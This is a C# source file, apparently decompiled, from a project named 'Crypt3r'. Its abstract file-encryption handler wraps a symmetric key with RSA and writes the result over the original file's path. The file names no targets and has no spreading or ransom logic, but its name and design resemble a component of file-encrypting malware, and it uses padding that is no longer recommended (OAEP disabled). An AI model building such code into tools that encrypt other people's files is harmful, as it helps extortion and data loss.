using System;
using System.Security.Cryptography;
using System.Text;
using Alphaleonis.Win32.Filesystem;

namespace Crypt3r;

public abstract class Handler
{
	protected string RSAKey { get; }

	protected string OriPath { get; }

	protected string EncPath { get; }

	public Handler(string rKey, string oFile, string eFile)
	{
		RSAKey = rKey;
		OriPath = oFile;
		EncPath = eFile;
	}

	public abstract void EncryptFile();

	public abstract void DecryptFile();

	public void SaveKeyInfo(KeyInfo ki)
	{
		string text = Convert.ToBase64String(ki.Key);
		string text2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(ki.Info));
		string s = text + "," + text2;
		File.WriteAllBytes(OriPath, RsaEncrypt(Encoding.UTF8.GetBytes(s), RSAKey));
	}

	public KeyInfo ReadKeyInfo()
	{
		byte[] bytes = RsaDecrypt(File.ReadAllBytes(OriPath), RSAKey);
		string[] array = Encoding.UTF8.GetString(bytes).Split(new char[1] { ',' });
		return new KeyInfo
		{
			Key = Convert.FromBase64String(array[0]),
			Info = Encoding.UTF8.GetString(Convert.FromBase64String(array[1]))
		};
	}

	public static byte[] RsaEncrypt(byte[] data, string publicKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(data, fOAEP: false);
	}

	public static byte[] RsaDecrypt(byte[] data, string privateKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(privateKey);
		return rSACryptoServiceProvider.Decrypt(data, fOAEP: false);
	}
}
